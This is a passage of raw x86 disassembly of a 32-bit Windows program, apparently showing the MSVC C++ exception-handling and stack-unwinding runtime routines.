  4031cc:	8b 48 08             	mov    0x8(%eax),%ecx
  4031cf:	33 4d 0c             	xor    0xc(%ebp),%ecx
  4031d2:	e8 a4 eb ff ff       	call   0x401d7b
  4031d7:	90                   	nop
  4031d8:	8b 45 08             	mov    0x8(%ebp),%eax
  4031db:	8b 40 04             	mov    0x4(%eax),%eax
  4031de:	83 e0 66             	and    $0x66,%eax
  4031e1:	74 11                	je     0x4031f4
  4031e3:	8b 45 0c             	mov    0xc(%ebp),%eax
  4031e6:	c7 40 24 01 00 00 00 	movl   $0x1,0x24(%eax)
  4031ed:	33 c0                	xor    %eax,%eax
  4031ef:	40                   	inc    %eax
  4031f0:	eb 6d                	jmp    0x40325f
  4031f2:	eb 6b                	jmp    0x40325f
  4031f4:	6a 01                	push   $0x1
  4031f6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4031f9:	ff 70 18             	push   0x18(%eax)
  4031fc:	8b 45 0c             	mov    0xc(%ebp),%eax
  4031ff:	ff 70 14             	push   0x14(%eax)
  403202:	8b 45 0c             	mov    0xc(%ebp),%eax
  403205:	ff 70 0c             	push   0xc(%eax)
  403208:	6a 00                	push   $0x0
  40320a:	ff 75 10             	push   0x10(%ebp)
  40320d:	8b 45 0c             	mov    0xc(%ebp),%eax
  403210:	ff 70 10             	push   0x10(%eax)
  403213:	ff 75 08             	push   0x8(%ebp)
  403216:	e8 41 09 00 00       	call   0x403b5c
  40321b:	83 c4 20             	add    $0x20,%esp
  40321e:	8b 45 0c             	mov    0xc(%ebp),%eax
  403221:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  403225:	75 0c                	jne    0x403233
  403227:	ff 75 08             	push   0x8(%ebp)
  40322a:	ff 75 0c             	push   0xc(%ebp)
  40322d:	e8 a0 fe ff ff       	call   0x4030d2
  403232:	90                   	nop
  403233:	6a 00                	push   $0x0
  403235:	6a 00                	push   $0x0
  403237:	6a 00                	push   $0x0
  403239:	6a 00                	push   $0x0
  40323b:	6a 00                	push   $0x0
  40323d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  403240:	50                   	push   %eax
  403241:	68 23 01 00 00       	push   $0x123
  403246:	e8 58 fd ff ff       	call   0x402fa3
  40324b:	83 c4 1c             	add    $0x1c,%esp
  40324e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403251:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  403254:	8b 63 1c             	mov    0x1c(%ebx),%esp
  403257:	8b 6b 20             	mov    0x20(%ebx),%ebp
  40325a:	ff e0                	jmp    *%eax
  40325c:	33 c0                	xor    %eax,%eax
  40325e:	40                   	inc    %eax
  40325f:	5b                   	pop    %ebx
  403260:	c9                   	leave
  403261:	c3                   	ret
  403262:	55                   	push   %ebp
  403263:	8b ec                	mov    %esp,%ebp
  403265:	83 ec 08             	sub    $0x8,%esp
  403268:	53                   	push   %ebx
  403269:	56                   	push   %esi
  40326a:	57                   	push   %edi
  40326b:	fc                   	cld
  40326c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40326f:	33 c0                	xor    %eax,%eax
  403271:	50                   	push   %eax
  403272:	50                   	push   %eax
  403273:	50                   	push   %eax
  403274:	ff 75 fc             	push   -0x4(%ebp)
  403277:	ff 75 14             	push   0x14(%ebp)
  40327a:	ff 75 10             	push   0x10(%ebp)
  40327d:	ff 75 0c             	push   0xc(%ebp)
  403280:	ff 75 08             	push   0x8(%ebp)
  403283:	e8 d4 08 00 00       	call   0x403b5c
  403288:	83 c4 20             	add    $0x20,%esp
  40328b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40328e:	5f                   	pop    %edi
  40328f:	5e                   	pop    %esi
  403290:	5b                   	pop    %ebx
  403291:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403294:	8b e5                	mov    %ebp,%esp
  403296:	5d                   	pop    %ebp
  403297:	c3                   	ret
  403298:	6a 10                	push   $0x10
  40329a:	68 70 75 41 00       	push   $0x417570
  40329f:	e8 6c e7 ff ff       	call   0x401a10
  4032a4:	33 db                	xor    %ebx,%ebx
  4032a6:	8b 45 10             	mov    0x10(%ebp),%eax
  4032a9:	8b 48 04             	mov    0x4(%eax),%ecx
  4032ac:	85 c9                	test   %ecx,%ecx
  4032ae:	0f 84 0a 01 00 00    	je     0x4033be
  4032b4:	38 59 08             	cmp    %bl,0x8(%ecx)
  4032b7:	0f 84 01 01 00 00    	je     0x4033be
  4032bd:	8b 50 08             	mov    0x8(%eax),%edx
  4032c0:	85 d2                	test   %edx,%edx
  4032c2:	75 08                	jne    0x4032cc
  4032c4:	39 18                	cmp    %ebx,(%eax)
  4032c6:	0f 8d f2 00 00 00    	jge    0x4033be
  4032cc:	8b 08                	mov    (%eax),%ecx
  4032ce:	8b 75 0c             	mov    0xc(%ebp),%esi
  4032d1:	85 c9                	test   %ecx,%ecx
  4032d3:	78 05                	js     0x4032da
  4032d5:	83 c6 0c             	add    $0xc,%esi
  4032d8:	03 f2                	add    %edx,%esi
  4032da:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4032dd:	8b 7d 14             	mov    0x14(%ebp),%edi
  4032e0:	84 c9                	test   %cl,%cl
  4032e2:	79 20                	jns    0x403304
  4032e4:	f6 07 10             	testb  $0x10,(%edi)
  4032e7:	74 1b                	je     0x403304
  4032e9:	a1 f4 9c 41 00       	mov    0x419cf4,%eax
  4032ee:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4032f1:	85 c0                	test   %eax,%eax
  4032f3:	74 0f                	je     0x403304
  4032f5:	8b c8                	mov    %eax,%ecx
  4032f7:	ff 15 48 21 41 00    	call   *0x412148
  4032fd:	ff 55 e4             	call   *-0x1c(%ebp)
  403300:	8b c8                	mov    %eax,%ecx
  403302:	eb 0b                	jmp    0x40330f
  403304:	8b 45 08             	mov    0x8(%ebp),%eax
  403307:	f6 c1 08             	test   $0x8,%cl
  40330a:	74 1c                	je     0x403328
  40330c:	8b 48 18             	mov    0x18(%eax),%ecx
  40330f:	85 c9                	test   %ecx,%ecx
  403311:	0f 84 b9 00 00 00    	je     0x4033d0
  403317:	85 f6                	test   %esi,%esi
  403319:	0f 84 b1 00 00 00    	je     0x4033d0
  40331f:	89 0e                	mov    %ecx,(%esi)
  403321:	8d 47 08             	lea    0x8(%edi),%eax
  403324:	50                   	push   %eax
  403325:	51                   	push   %ecx
  403326:	eb 37                	jmp    0x40335f
  403328:	f6 07 01             	testb  $0x1,(%edi)
  40332b:	74 3d                	je     0x40336a
  40332d:	83 78 18 00          	cmpl   $0x0,0x18(%eax)
  403331:	0f 84 99 00 00 00    	je     0x4033d0
  403337:	85 f6                	test   %esi,%esi
  403339:	0f 84 91 00 00 00    	je     0x4033d0
  40333f:	ff 77 14             	push   0x14(%edi)
  403342:	ff 70 18             	push   0x18(%eax)
  403345:	56                   	push   %esi
  403346:	e8 65 eb ff ff       	call   0x401eb0
  40334b:	83 c4 0c             	add    $0xc,%esp
  40334e:	83 7f 14 04          	cmpl   $0x4,0x14(%edi)
  403352:	75 56                	jne    0x4033aa
  403354:	83 3e 00             	cmpl   $0x0,(%esi)
  403357:	74 51                	je     0x4033aa
  403359:	8d 47 08             	lea    0x8(%edi),%eax
  40335c:	50                   	push   %eax
  40335d:	ff 36                	push   (%esi)
  40335f:	e8 0f f4 ff ff       	call   0x402773
  403364:	59                   	pop    %ecx
  403365:	59                   	pop    %ecx
  403366:	89 06                	mov    %eax,(%esi)
  403368:	eb 40                	jmp    0x4033aa
  40336a:	8b 48 18             	mov    0x18(%eax),%ecx
  40336d:	39 5f 18             	cmp    %ebx,0x18(%edi)
  403370:	75 23                	jne    0x403395
  403372:	85 c9                	test   %ecx,%ecx
  403374:	74 5a                	je     0x4033d0
  403376:	85 f6                	test   %esi,%esi
  403378:	74 56                	je     0x4033d0
  40337a:	ff 77 14             	push   0x14(%edi)
  40337d:	8d 47 08             	lea    0x8(%edi),%eax
  403380:	50                   	push   %eax
  403381:	51                   	push   %ecx
  403382:	e8 ec f3 ff ff       	call   0x402773
  403387:	59                   	pop    %ecx
  403388:	59                   	pop    %ecx
  403389:	50                   	push   %eax
  40338a:	56                   	push   %esi
  40338b:	e8 20 eb ff ff       	call   0x401eb0
  403390:	83 c4 0c             	add    $0xc,%esp
  403393:	eb 15                	jmp    0x4033aa
  403395:	85 c9                	test   %ecx,%ecx
  403397:	74 37                	je     0x4033d0
  403399:	85 f6                	test   %esi,%esi
  40339b:	74 33                	je     0x4033d0
  40339d:	f6 07 04             	testb  $0x4,(%edi)
  4033a0:	6a 00                	push   $0x0
  4033a2:	5b                   	pop    %ebx
  4033a3:	0f 95 c3             	setne  %bl
  4033a6:	43                   	inc    %ebx
  4033a7:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  4033aa:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4033b1:	8b c3                	mov    %ebx,%eax
  4033b3:	eb 0b                	jmp    0x4033c0
  4033b5:	33 c0                	xor    %eax,%eax
  4033b7:	40                   	inc    %eax
  4033b8:	c3                   	ret
  4033b9:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4033bc:	eb 12                	jmp    0x4033d0
  4033be:	33 c0                	xor    %eax,%eax
  4033c0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4033c3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4033ca:	59                   	pop    %ecx
  4033cb:	5f                   	pop    %edi
  4033cc:	5e                   	pop    %esi
  4033cd:	5b                   	pop    %ebx
  4033ce:	c9                   	leave
  4033cf:	c3                   	ret
  4033d0:	e8 8a 31 00 00       	call   0x40655f
  4033d5:	cc                   	int3
  4033d6:	6a 08                	push   $0x8
  4033d8:	68 90 75 41 00       	push   $0x417590
  4033dd:	e8 2e e6 ff ff       	call   0x401a10
  4033e2:	8b 55 10             	mov    0x10(%ebp),%edx
  4033e5:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4033e8:	83 3a 00             	cmpl   $0x0,(%edx)
  4033eb:	7d 04                	jge    0x4033f1
  4033ed:	8b f9                	mov    %ecx,%edi
  4033ef:	eb 06                	jmp    0x4033f7
  4033f1:	8d 79 0c             	lea    0xc(%ecx),%edi
  4033f4:	03 7a 08             	add    0x8(%edx),%edi
  4033f7:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4033fe:	8b 75 14             	mov    0x14(%ebp),%esi
  403401:	56                   	push   %esi
  403402:	52                   	push   %edx
  403403:	51                   	push   %ecx
  403404:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403407:	53                   	push   %ebx
  403408:	e8 8b fe ff ff       	call   0x403298
  40340d:	83 c4 10             	add    $0x10,%esp
  403410:	83 e8 01             	sub    $0x1,%eax
  403413:	74 21                	je     0x403436
  403415:	83 e8 01             	sub    $0x1,%eax
  403418:	75 34                	jne    0x40344e
  40341a:	8d 46 08             	lea    0x8(%esi),%eax
  40341d:	50                   	push   %eax
  40341e:	ff 73 18             	push   0x18(%ebx)
  403421:	e8 4d f3 ff ff       	call   0x402773
  403426:	59                   	pop    %ecx
  403427:	59                   	pop    %ecx
  403428:	6a 01                	push   $0x1
  40342a:	50                   	push   %eax
  40342b:	ff 76 18             	push   0x18(%esi)
  40342e:	57                   	push   %edi
  40342f:	e8 04 0c 00 00       	call   0x404038
  403434:	eb 18                	jmp    0x40344e
  403436:	8d 46 08             	lea    0x8(%esi),%eax
  403439:	50                   	push   %eax
  40343a:	ff 73 18             	push   0x18(%ebx)
  40343d:	e8 31 f3 ff ff       	call   0x402773
  403442:	59                   	pop    %ecx
  403443:	59                   	pop    %ecx
  403444:	50                   	push   %eax
  403445:	ff 76 18             	push   0x18(%esi)
  403448:	57                   	push   %edi
  403449:	e8 da 0b 00 00       	call   0x404028
  40344e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  403455:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403458:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40345f:	59                   	pop    %ecx
  403460:	5f                   	pop    %edi
  403461:	5e                   	pop    %esi
  403462:	5b                   	pop    %ebx
  403463:	c9                   	leave
  403464:	c3                   	ret
  403465:	33 c0                	xor    %eax,%eax
  403467:	40                   	inc    %eax
  403468:	c3                   	ret
  403469:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40346c:	e8 ee 30 00 00       	call   0x40655f
  403471:	cc                   	int3
  403472:	55                   	push   %ebp
  403473:	8b ec                	mov    %esp,%ebp
  403475:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  403479:	53                   	push   %ebx
  40347a:	8b 5d 1c             	mov    0x1c(%ebp),%ebx
  40347d:	56                   	push   %esi
  40347e:	57                   	push   %edi
  40347f:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403482:	74 10                	je     0x403494
  403484:	ff 75 20             	push   0x20(%ebp)
  403487:	53                   	push   %ebx
  403488:	57                   	push   %edi
  403489:	ff 75 08             	push   0x8(%ebp)
  40348c:	e8 45 ff ff ff       	call   0x4033d6
  403491:	83 c4 10             	add    $0x10,%esp
  403494:	83 7d 2c 00          	cmpl   $0x0,0x2c(%ebp)
  403498:	8b c7                	mov    %edi,%eax
  40349a:	ff 75 08             	push   0x8(%ebp)
  40349d:	0f 45 45 2c          	cmovne 0x2c(%ebp),%eax
  4034a1:	50                   	push   %eax
  4034a2:	e8 2b fc ff ff       	call   0x4030d2
  4034a7:	8b 75 24             	mov    0x24(%ebp),%esi
  4034aa:	ff 36                	push   (%esi)
  4034ac:	ff 75 18             	push   0x18(%ebp)
  4034af:	ff 75 14             	push   0x14(%ebp)
  4034b2:	57                   	push   %edi
  4034b3:	e8 e8 09 00 00       	call   0x403ea0
  4034b8:	8b 46 04             	mov    0x4(%esi),%eax
  4034bb:	40                   	inc    %eax
  4034bc:	50                   	push   %eax
  4034bd:	ff 75 18             	push   0x18(%ebp)
  4034c0:	57                   	push   %edi
  4034c1:	e8 30 0c 00 00       	call   0x4040f6
  4034c6:	68 00 01 00 00       	push   $0x100
  4034cb:	ff 75 28             	push   0x28(%ebp)
  4034ce:	ff 73 0c             	push   0xc(%ebx)
  4034d1:	ff 75 18             	push   0x18(%ebp)
  4034d4:	ff 75 10             	push   0x10(%ebp)
  4034d7:	57                   	push   %edi
  4034d8:	ff 75 08             	push   0x8(%ebp)
  4034db:	e8 4d 07 00 00       	call   0x403c2d
  4034e0:	83 c4 38             	add    $0x38,%esp
  4034e3:	85 c0                	test   %eax,%eax
  4034e5:	74 07                	je     0x4034ee
  4034e7:	57                   	push   %edi
  4034e8:	50                   	push   %eax
  4034e9:	e8 b4 fb ff ff       	call   0x4030a2
  4034ee:	5f                   	pop    %edi
  4034ef:	5e                   	pop    %esi
  4034f0:	5b                   	pop    %ebx
  4034f1:	5d                   	pop    %ebp
  4034f2:	c3                   	ret
  4034f3:	55                   	push   %ebp
  4034f4:	8b ec                	mov    %esp,%ebp
  4034f6:	83 ec 64             	sub    $0x64,%esp
  4034f9:	53                   	push   %ebx
  4034fa:	56                   	push   %esi
  4034fb:	57                   	push   %edi
  4034fc:	8b 7d 18             	mov    0x18(%ebp),%edi
  4034ff:	33 c0                	xor    %eax,%eax
  403501:	57                   	push   %edi
  403502:	ff 75 14             	push   0x14(%ebp)
  403505:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403508:	ff 75 0c             	push   0xc(%ebp)
  40350b:	88 45 e8             	mov    %al,-0x18(%ebp)
  40350e:	e8 c6 0b 00 00       	call   0x4040d9
  403513:	8b c8                	mov    %eax,%ecx
  403515:	83 c4 0c             	add    $0xc,%esp
  403518:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40351b:	83 f9 ff             	cmp    $0xffffffff,%ecx
  40351e:	0f 8c 6c 03 00 00    	jl     0x403890
  403524:	3b 4f 04             	cmp    0x4(%edi),%ecx
  403527:	0f 8d 63 03 00 00    	jge    0x403890
  40352d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  403530:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%ebx)
  403536:	0f 85 f7 00 00 00    	jne    0x403633
  40353c:	83 7b 10 03          	cmpl   $0x3,0x10(%ebx)
  403540:	0f 85 ed 00 00 00    	jne    0x403633
  403546:	81 7b 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ebx)
  40354d:	74 16                	je     0x403565
  40354f:	81 7b 14 21 05 93 19 	cmpl   $0x19930521,0x14(%ebx)
  403556:	74 0d                	je     0x403565
  403558:	81 7b 14 22 05 93 19 	cmpl   $0x19930522,0x14(%ebx)
  40355f:	0f 85 ce 00 00 00    	jne    0x403633
  403565:	33 f6                	xor    %esi,%esi
  403567:	39 73 1c             	cmp    %esi,0x1c(%ebx)
  40356a:	0f 85 c3 00 00 00    	jne    0x403633
  403570:	e8 ae f5 ff ff       	call   0x402b23
  403575:	39 70 10             	cmp    %esi,0x10(%eax)
  403578:	0f 84 a8 02 00 00    	je     0x403826
  40357e:	e8 a0 f5 ff ff       	call   0x402b23
  403583:	8b 58 10             	mov    0x10(%eax),%ebx
  403586:	e8 98 f5 ff ff       	call   0x402b23
  40358b:	c6 45 e8 01          	movb   $0x1,-0x18(%ebp)
  40358f:	8b 40 14             	mov    0x14(%eax),%eax
  403592:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403595:	85 db                	test   %ebx,%ebx
  403597:	0f 84 f3 02 00 00    	je     0x403890
  40359d:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%ebx)
  4035a3:	75 2a                	jne    0x4035cf
  4035a5:	83 7b 10 03          	cmpl   $0x3,0x10(%ebx)
  4035a9:	75 24                	jne    0x4035cf
  4035ab:	81 7b 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ebx)
  4035b2:	74 12                	je     0x4035c6
  4035b4:	81 7b 14 21 05 93 19 	cmpl   $0x19930521,0x14(%ebx)
  4035bb:	74 09                	je     0x4035c6
  4035bd:	81 7b 14 22 05 93 19 	cmpl   $0x19930522,0x14(%ebx)
  4035c4:	75 09                	jne    0x4035cf
  4035c6:	39 73 1c             	cmp    %esi,0x1c(%ebx)
  4035c9:	0f 84 c1 02 00 00    	je     0x403890
  4035cf:	e8 4f f5 ff ff       	call   0x402b23
  4035d4:	39 70 1c             	cmp    %esi,0x1c(%eax)
  4035d7:	74 62                	je     0x40363b
  4035d9:	e8 45 f5 ff ff       	call   0x402b23
  4035de:	8b 40 1c             	mov    0x1c(%eax),%eax
  4035e1:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4035e4:	e8 3a f5 ff ff       	call   0x402b23
  4035e9:	ff 75 f4             	push   -0xc(%ebp)
  4035ec:	53                   	push   %ebx
  4035ed:	89 70 1c             	mov    %esi,0x1c(%eax)
  4035f0:	e8 99 09 00 00       	call   0x403f8e
  4035f5:	59                   	pop    %ecx
  4035f6:	59                   	pop    %ecx
  4035f7:	84 c0                	test   %al,%al
  4035f9:	75 40                	jne    0x40363b
  4035fb:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4035fe:	39 37                	cmp    %esi,(%edi)
  403600:	0f 8e 25 02 00 00    	jle    0x40382b
  403606:	8b 47 04             	mov    0x4(%edi),%eax
  403609:	68 30 99 41 00       	push   $0x419930
  40360e:	8b 4c 06 04          	mov    0x4(%esi,%eax,1),%ecx
  403612:	e8 ca 05 00 00       	call   0x403be1
  403617:	84 c0                	test   %al,%al
  403619:	0f 85 11 02 00 00    	jne    0x403830
  40361f:	8b 45 f0             	mov    -0x10(%ebp),%eax
  403622:	83 c6 10             	add    $0x10,%esi
  403625:	40                   	inc    %eax
  403626:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403629:	3b 07                	cmp    (%edi),%eax
  40362b:	0f 8d fa 01 00 00    	jge    0x40382b
  403631:	eb d3                	jmp    0x403606
  403633:	8b 55 10             	mov    0x10(%ebp),%edx
  403636:	89 55 fc             	mov    %edx,-0x4(%ebp)
  403639:	eb 06                	jmp    0x403641
  40363b:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40363e:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  403641:	33 c0                	xor    %eax,%eax
  403643:	89 7d d0             	mov    %edi,-0x30(%ebp)
  403646:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  403649:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%ebx)
  40364f:	0f 85 a0 01 00 00    	jne    0x4037f5
  403655:	83 7b 10 03          	cmpl   $0x3,0x10(%ebx)
  403659:	0f 85 96 01 00 00    	jne    0x4037f5
  40365f:	81 7b 14 20 05 93 19 	cmpl   $0x19930520,0x14(%ebx)
  403666:	74 16                	je     0x40367e
  403668:	81 7b 14 21 05 93 19 	cmpl   $0x19930521,0x14(%ebx)
  40366f:	74 0d                	je     0x40367e
  403671:	81 7b 14 22 05 93 19 	cmpl   $0x19930522,0x14(%ebx)
  403678:	0f 85 77 01 00 00    	jne    0x4037f5
  40367e:	39 47 0c             	cmp    %eax,0xc(%edi)
  403681:	0f 86 0e 01 00 00    	jbe    0x403795
  403687:	ff 75 20             	push   0x20(%ebp)
  40368a:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40368d:	57                   	push   %edi
  40368e:	ff 75 14             	push   0x14(%ebp)
  403691:	51                   	push   %ecx
  403692:	50                   	push   %eax
  403693:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403696:	50                   	push   %eax
  403697:	e8 38 f8 ff ff       	call   0x402ed4
  40369c:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  40369f:	83 c4 18             	add    $0x18,%esp
  4036a2:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4036a5:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4036a8:	89 55 f4             	mov    %edx,-0xc(%ebp)
  4036ab:	3b 55 cc             	cmp    -0x34(%ebp),%edx
  4036ae:	0f 83 e1 00 00 00    	jae    0x403795
  4036b4:	6b ca 14             	imul   $0x14,%edx,%ecx
  4036b7:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4036ba:	8b 00                	mov    (%eax),%eax
  4036bc:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4036bf:	6a 05                	push   $0x5
  4036c1:	8b 70 10             	mov    0x10(%eax),%esi
  4036c4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4036c7:	03 f1                	add    %ecx,%esi
  4036c9:	59                   	pop    %ecx
  4036ca:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4036cc:	39 45 9c             	cmp    %eax,-0x64(%ebp)
  4036cf:	0f 8f a4 00 00 00    	jg     0x403779
  4036d5:	3b 45 a0             	cmp    -0x60(%ebp),%eax
  4036d8:	0f 8f 9b 00 00 00    	jg     0x403779
  4036de:	33 c9                	xor    %ecx,%ecx
  4036e0:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4036e3:	39 4d a8             	cmp    %ecx,-0x58(%ebp)
  4036e6:	0f 84 8d 00 00 00    	je     0x403779
  4036ec:	8b 53 1c             	mov    0x1c(%ebx),%edx
  4036ef:	8b 42 0c             	mov    0xc(%edx),%eax
  4036f2:	8b 30                	mov    (%eax),%esi
  4036f4:	83 c0 04             	add    $0x4,%eax
  4036f7:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4036fa:	8b 45 ac             	mov    -0x54(%ebp),%eax
  4036fd:	89 75 dc             	mov    %esi,-0x24(%ebp)
  403700:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403703:	8b f0                	mov    %eax,%esi
  403705:	8d 7d b0             	lea    -0x50(%ebp),%edi
  403708:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403709:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40370a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40370b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40370c:	8b 75 dc             	mov    -0x24(%ebp),%esi
  40370f:	8b 7d e0             	mov    -0x20(%ebp),%edi
  403712:	85 f6                	test   %esi,%esi
  403714:	7e 24                	jle    0x40373a
  403716:	52                   	push   %edx
  403717:	ff 37                	push   (%edi)
  403719:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40371c:	50                   	push   %eax
  40371d:	e8 aa 02 00 00       	call   0x4039cc
  403722:	83 c4 0c             	add    $0xc,%esp
  403725:	85 c0                	test   %eax,%eax
  403727:	75 22                	jne    0x40374b
  403729:	8b 53 1c             	mov    0x1c(%ebx),%edx
  40372c:	4e                   	dec    %esi
  40372d:	83 c7 04             	add    $0x4,%edi
  403730:	85 f6                	test   %esi,%esi
  403732:	7f e2                	jg     0x403716
  403734:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  403737:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40373a:	41                   	inc    %ecx
  40373b:	83 c0 10             	add    $0x10,%eax
  40373e:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  403741:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403744:	3b 4d a8             	cmp    -0x58(%ebp),%ecx
  403747:	75 ba                	jne    0x403703
  403749:	eb 2b                	jmp    0x403776
  40374b:	ff 75 1c             	push   0x1c(%ebp)
  40374e:	8d 45 9c             	lea    -0x64(%ebp),%eax
  403751:	ff 75 e8             	push   -0x18(%ebp)
  403754:	ff 75 24             	push   0x24(%ebp)
  403757:	ff 75 20             	push   0x20(%ebp)
  40375a:	50                   	push   %eax
  40375b:	ff 37                	push   (%edi)
  40375d:	8d 45 b0             	lea    -0x50(%ebp),%eax
  403760:	50                   	push   %eax
  403761:	ff 75 18             	push   0x18(%ebp)
  403764:	ff 75 14             	push   0x14(%ebp)
  403767:	ff 75 fc             	push   -0x4(%ebp)
  40376a:	ff 75 0c             	push   0xc(%ebp)
  40376d:	53                   	push   %ebx
  40376e:	e8 ff fc ff ff       	call   0x403472
  403773:	83 c4 30             	add    $0x30,%esp
  403776:	8b 55 f4             	mov    -0xc(%ebp),%edx
  403779:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40377c:	42                   	inc    %edx
  40377d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  403780:	83 c1 14             	add    $0x14,%ecx
  403783:	89 55 f4             	mov    %edx,-0xc(%ebp)
  403786:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  403789:	3b 55 cc             	cmp    -0x34(%ebp),%edx
  40378c:	0f 82 28 ff ff ff    	jb     0x4036ba
  403792:	8b 7d 18             	mov    0x18(%ebp),%edi
  403795:	80 7d 1c 00          	cmpb   $0x0,0x1c(%ebp)
  403799:	74 0a                	je     0x4037a5
  40379b:	6a 01                	push   $0x1
  40379d:	53                   	push   %ebx
  40379e:	e8 9d ee ff ff       	call   0x402640
  4037a3:	59                   	pop    %ecx
  4037a4:	59                   	pop    %ecx
  4037a5:	8b 07                	mov    (%edi),%eax
  4037a7:	25 ff ff ff 1f       	and    $0x1fffffff,%eax
  4037ac:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  4037b1:	72 68                	jb     0x40381b
  4037b3:	8b 47 20             	mov    0x20(%edi),%eax
  4037b6:	c1 e8 02             	shr    $0x2,%eax
  4037b9:	83 7f 1c 00          	cmpl   $0x0,0x1c(%edi)
  4037bd:	75 0c                	jne    0x4037cb
  4037bf:	a8 01                	test   $0x1,%al
  4037c1:	74 58                	je     0x40381b
  4037c3:	83 7d 20 00          	cmpl   $0x0,0x20(%ebp)
  4037c7:	75 52                	jne    0x40381b
  4037c9:	eb 04                	jmp    0x4037cf
  4037cb:	a8 01                	test   $0x1,%al
  4037cd:	74 15                	je     0x4037e4
  4037cf:	e8 4f f3 ff ff       	call   0x402b23
  4037d4:	89 58 10             	mov    %ebx,0x10(%eax)
  4037d7:	e8 47 f3 ff ff       	call   0x402b23
  4037dc:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4037df:	89 48 14             	mov    %ecx,0x14(%eax)
  4037e2:	eb 47                	jmp    0x40382b
  4037e4:	ff 77 1c             	push   0x1c(%edi)
  4037e7:	53                   	push   %ebx
  4037e8:	e8 a1 07 00 00       	call   0x403f8e
  4037ed:	59                   	pop    %ecx
  4037ee:	59                   	pop    %ecx
  4037ef:	84 c0                	test   %al,%al
  4037f1:	74 5d                	je     0x403850
  4037f3:	eb 26                	jmp    0x40381b
  4037f5:	39 47 0c             	cmp    %eax,0xc(%edi)
  4037f8:	76 21                	jbe    0x40381b
  4037fa:	38 45 1c             	cmp    %al,0x1c(%ebp)
  4037fd:	0f 85 8d 00 00 00    	jne    0x403890
  403803:	ff 75 24             	push   0x24(%ebp)
  403806:	ff 75 20             	push   0x20(%ebp)
  403809:	51                   	push   %ecx
  40380a:	57                   	push   %edi
  40380b:	ff 75 14             	push   0x14(%ebp)
  40380e:	52                   	push   %edx
  40380f:	ff 75 0c             	push   0xc(%ebp)
  403812:	53                   	push   %ebx
  403813:	e8 7e 00 00 00       	call   0x403896
  403818:	83 c4 20             	add    $0x20,%esp
  40381b:	e8 03 f3 ff ff       	call   0x402b23
  403820:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  403824:	75 6a                	jne    0x403890
  403826:	5f                   	pop    %edi
  403827:	5e                   	pop    %esi
  403828:	5b                   	pop    %ebx
  403829:	c9                   	leave
  40382a:	c3                   	ret
  40382b:	e8 3c 2c 00 00       	call   0x40646c
  403830:	6a 01                	push   $0x1
  403832:	53                   	push   %ebx
  403833:	e8 08 ee ff ff       	call   0x402640
  403838:	59                   	pop    %ecx
  403839:	59                   	pop    %ecx
  40383a:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  40383d:	e8 3e 03 00 00       	call   0x403b80
  403842:	68 ac 75 41 00       	push   $0x4175ac
  403847:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40384a:	50                   	push   %eax
